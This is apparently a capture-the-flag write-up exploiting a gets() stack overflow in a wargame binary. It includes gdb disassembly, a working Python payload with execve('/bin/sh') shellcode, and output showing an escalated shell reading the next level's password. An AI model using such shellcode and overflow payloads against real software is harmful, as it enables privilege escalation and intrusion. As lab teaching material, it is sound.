## Level 2

level2:53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77


Started running `level2` in gdb and disassembling the main function which calls a function called `p`.
```
(gdb) disas main
   ...
   0x08048545 <+6>:	call   0x80484d4 <p>
   0x0804854a <+11>:	leave
   0x0804854b <+12>:	ret
```

After that it uses the vulnerable function `gets()` to get user input.
```
   ...
   0x080484e7 <+19>:	lea    eax,[ebp-0x4c]
   0x080484ea <+22>:	mov    DWORD PTR [esp],eax
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
   ...
```

Than it checks that the return address (ebp+0x4) pushed to the stack by main() doesn't start with '0xb', the purpose of this is to check if we overwrote it with an address from the stack which prevents us from executing a shellcode.
```
   ...
   0x080484f2 <+30>:	mov    eax,DWORD PTR [ebp+0x4]
   0x080484f5 <+33>:	mov    DWORD PTR [ebp-0xc],eax
   0x080484f8 <+36>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080484fb <+39>:	and    eax,0xb0000000
   0x08048500 <+44>:	cmp    eax,0xb0000000
   ...
```

After passing this check the inputed string is printed using puts()
```
   ...
   0x08048527 <+83>:	lea    eax,[ebp-0x4c]
   0x0804852a <+86>:	mov    DWORD PTR [esp],eax
   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
   ...
```

And lastly, strdup() is used to allocate heap memory and copy the user input into it.
```
   ...
   0x08048532 <+94>:	lea    eax,[ebp-0x4c]
   0x08048535 <+97>:	mov    DWORD PTR [esp],eax
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
   ...
```

We'll craft a shellcode and inject its address from heap instead of the previous return address, this way we bypass the condition above.

```
(gdb) disas p
Dump of assembler code for function p:
...
   0x08048535 <+97>:    mov    DWORD PTR [esp],eax
   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:   leave
   0x0804853e <+106>:   ret
End of assembler dump.
```

```
(gdb) b *0x0804853d
Breakpoint 1 at 0x804853d

(gdb) run
Starting program: /home/user/level2/level2
hello
hello

Breakpoint 1, 0x0804853d in p ()
```

```
(gdb) info registers
eax            0x804a008        134520840
ecx            0x0      0
...
```

```
~$ python -c 'print "A"*80 + "\x5c\xa0\x04\x08" + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"' | ./level2
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA11۰̀Sh/ttyh/dev1f'̀1Ph//shh/binPSᙰ

$ id
uid=2021(level2) gid=2021(level2) euid=2022(level3) egid=100(users) groups=2022(level3),100(users),2021(level2)
$
$ cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```